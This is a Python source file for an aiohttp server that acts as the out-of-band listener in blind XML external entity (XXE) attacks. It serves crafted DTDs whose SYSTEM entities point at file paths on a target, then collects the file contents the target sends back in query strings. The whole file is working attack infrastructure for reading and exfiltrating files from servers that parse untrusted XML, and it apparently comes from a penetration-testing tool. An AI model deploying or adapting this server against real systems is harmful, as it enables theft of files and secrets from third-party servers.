import asyncio
import random
from urllib import parse

from aiohttp import web
from functools import partial

TEST_RESPONSE = random.randint(1, 1500)


@asyncio.coroutine
def test_handler(server, request):
    return web.Response(text="<test>{}</test>".format(TEST_RESPONSE), content_type="text/xml")


@asyncio.coroutine
def entity_handler(server, request):
    file_id = request.match_info["id"]

    use_comment = False

    if file_id == "test":
        entity_value = '"{}"'.format(TEST_RESPONSE)

    elif server.expecting_identifier(file_id):
        use_comment, value = server.get_entity_value(file_id)
        entity_value = 'SYSTEM "{}"'.format(value)
    else:
        return web.Response(status=404)

    data_value = "&c;"
    if use_comment:
        data_value = "<!-- {} -->".format(data_value)

    return web.Response(
        text="<!DOCTYPE stuff [<!ELEMENT data ANY><!ENTITY c {}>]> <data>{}</data>".format(entity_value, data_value),
        content_type="text/xml"
    )


@asyncio.coroutine
def data_handler(server, request):
    id = request.match_info["id"]

    parsed_data = parse.parse_qs(request.query_string)

    if not server.expecting_identifier(id):
        return web.Response(status=404)
    if "d" not in parsed_data:
        parsed_data["d"] = []

    server.got_data(id, parsed_data)

    return web.Response(text="<test>{id}</test>".format(id=id), content_type="text/xml")


class OOBHttpServer(object):
    expectations = {}
    serve_files = {}

    _lock = asyncio.Lock()

    def __init__(self, host=None, port=None):
        self.tick = 0
        self.server = None
        self.external_ip, self.port = host, port

        self.app = web.Application()
        self.app.router.add_route("GET", "/test", partial(test_handler, self))
        self.app.router.add_route("GET", "/entity/{id}", partial(entity_handler, self))
        self.app.router.add_route("GET", "/{id}", partial(data_handler, self))

    def create_handler(self, *args, **kwargs):
        h = OOBHttpRequestHandler(keep_alive=75)
        h.server = self
        return h

    def expecting_identifier(self, identifier):
        return identifier in self.expectations

    def get_entity_value(self, id):
        return self.serve_files[id]

    def expect_entity_injection(self, entity_value, use_comment=False):
        """
        Expect a HTTP request and serve crafted XML entity
        :param entity_value: the value of the entity. Normally a file path
        :param use_comment: If True the entity will be inside a comment
        :return: a tuple of an ID and a future
        """
        tick, future = self.expect_data()
        self.serve_files[tick] = (use_comment, entity_value)
        return tick, future

    def expect_data(self):
        self.tick += 1
        future = asyncio.Future()
        self.expectations[str(self.tick)] = future
        return str(self.tick), future

    def got_data(self, id, data):
        self.expectations[id].set_result(data)
        del self.expectations[id]

    @asyncio.coroutine
    def start(self, port=None):
        with (yield from self._lock):
            if self.server is not None:
                return  # raise RuntimeError("Server has already been started")

            if port:
                self.port = port

            loop = asyncio.get_event_loop()
            self.server = yield from loop.create_server(
                self.app.make_handler(),
                "0.0.0.0", self.port
            )

            if self.port == 0:
                self.port = self.server.sockets[0].getsockname()[1]

            return

    def stop(self):
        if self.server is None:
            return  # raise RuntimeError("Server has not been started!")
        try:
            self.server.close()
        except RuntimeError:
            pass
        else:
            self.server = None

    @property
    def started(self):
        return self.server is not None

    @property
    def location(self):
        return "http://{}:{}".format(self.external_ip, self.port)


default = OOBHttpServer()
